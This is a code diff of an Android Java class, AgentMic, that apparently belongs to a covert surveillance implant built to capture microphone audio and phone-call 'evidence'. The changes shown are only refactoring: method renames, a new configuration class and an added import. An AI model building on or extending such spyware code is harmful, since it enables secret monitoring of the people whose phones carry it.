@@ -24,6 +24,7 @@ import com.android.service.LogR;
 import com.android.service.StateRun;
 import com.android.service.Status;
 import com.android.service.auto.Cfg;
+import com.android.service.conf.ConfAgent;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.interfaces.Observer;
 import com.android.service.listener.ListenerCall;
@@ -69,7 +70,7 @@ public class AgentMic extends BaseAgent implements Observer<Call>, OnErrorListen
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#begin()
 	 */
 	@Override
-	public void begin() {
+	public void actualStart() {
 		try {
 
 			if (Cfg.DEBUG) {
@@ -108,7 +109,7 @@ public class AgentMic extends BaseAgent implements Observer<Call>, OnErrorListen
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
 	 */
 	@Override
-	public void end() {
+	public void actualStop() {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (end)") ;//$NON-NLS-1$
 		}
@@ -133,7 +134,7 @@ public class AgentMic extends BaseAgent implements Observer<Call>, OnErrorListen
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
-	public void go() {
+	public void actualGo() {
 		if (Cfg.DEBUG) {
 			Check.requires(status == StateRun.STARTED, "inconsistent status"); //$NON-NLS-1$
 		}
@@ -240,7 +241,7 @@ public class AgentMic extends BaseAgent implements Observer<Call>, OnErrorListen
 	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
 	 */
 	@Override
-	public boolean parse(AgentConf conf) {
+	public boolean parse(ConfAgent conf) {
 		setPeriod(MIC_PERIOD);
 		setDelay(MIC_PERIOD);
 		return true;
